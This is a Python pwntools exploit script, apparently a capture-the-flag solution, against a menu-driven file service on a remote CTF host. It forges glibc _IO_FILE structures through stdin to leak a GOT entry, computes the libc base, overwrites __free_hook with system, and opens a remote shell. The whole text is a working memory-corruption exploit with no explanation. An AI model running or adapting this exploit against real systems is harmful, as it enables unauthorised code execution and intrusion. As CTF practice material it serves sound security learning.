from pwn import *

def openfile(fname):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Filnename:',fname)


def readfile(idx,size):
    r.sendlineafter('choice :','2')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))

def writefile():
    r.sendlineafter('choice :','3')

def create(size):
    r.sendlineafter('choice :','4')
    r.sendlineafter('Size:',str(size))

def delete():
    r.sendlineafter('choice :','5')


###Useful Address
atoll_got = 0x601fb8
atoll_base = 0x36eb0
free_hook_offset = 0x3c57a8
system_offset = 0x45390

###Useful Attributes
magic = 0xfbad0000
_IO_CURRENTLY_PUTTING = 0x800

###Start Exploit
context.arch = 'amd64'
r = remote('csie.ctf.tw',10147)

openfile('/proc/self/fd/0')
create(0x28)
writefile()
readfile(0,0x30+0x78)
_flag = magic | _IO_CURRENTLY_PUTTING
_IO_READ_BASE = atoll_got
_IO_READ_END  = _IO_READ_BASE+0x10
payload = b'\x00'*0x30+p64(_flag)+p64(0)+p64(_IO_READ_BASE)+p64(0)+p64(_IO_READ_BASE)+p64(_IO_READ_END)+p64(_IO_READ_END)+p64(0)*7+p64(1)
r.send(payload)
writefile()
libc_base = u64(r.recv(8))-atoll_base
free_hook_addr = libc_base+free_hook_offset
system_addr = libc_base+system_offset

create(0x28)
openfile('/proc/self/fd/0')
readfile(1,0x30+0x48)
_flag = magic
payload = b'\x00'*0x30+p64(_flag)+flat(-0x78)+p64(0)*5+p64(free_hook_addr-0x8)+p64(free_hook_addr+0x10)
r.sendline(payload)
readfile(1,0x10)
r.send(b'/bin/sh\x00'+p64(system_addr))
delete()
r.interactive()
